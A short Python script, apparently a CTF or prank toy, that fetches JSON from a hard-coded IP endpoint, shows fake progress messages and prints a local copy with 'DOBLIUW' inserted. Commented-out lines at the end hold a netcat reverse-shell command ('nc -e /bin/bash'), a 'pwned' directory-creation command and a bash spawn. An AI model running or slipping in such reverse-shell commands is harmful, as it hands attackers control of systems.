#!/usr/bin/python3
from pwn import *
import requests, sys, subprocess, time, pdb, signal

url ='http://54.177.224.223:9000/agencies/63'

def ctrl_c(sig, frame):
    print("\n[!] Quiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def run():
    p1 = log.progress("<Dobliuw/> script")
    time.sleep(3)
    r = requests.get(url)
    p1.status("Searching a info...")
    time.sleep(2)
    p1.status("Reading a info...")
    time.sleep(2)
    num = 10
    while num >= 0:
        p1.status("Parsing a JSON, please wait %ds " % (num))
        time.sleep(1)
        num = num - 1 
    print("\n[*] Your JSON:")
    time.sleep(2)
    obj = r.json()
    obj['name'] = "---> DOBLIUW <---"
    for num in range(20):
        obj['childrenAgencies'].append("DOBLIUW")
    print("\n", obj)
    #subprocess.run('whoami')
    #subprocess.run('pwd')
    #print("Reverse shell")
    #proc = subprocess.Popen(['nc -e /bin/bash 127.0.0.1 443'], stdout=subprocess.PIPE, shell=True)
    #proc2 = subprocess.Popen(['mkdir dirDobliuwFromOwen; cd dirDobliuwFromOwen; echo "pwned" >  pwned '], stdout=subprocess.PIPE, shell=True)
    #proc3 = subprocess.Popen(['/bin/bash'], stdout=subprocess.PIPE,  shell=True)

if __name__ == "__main__":
    run()
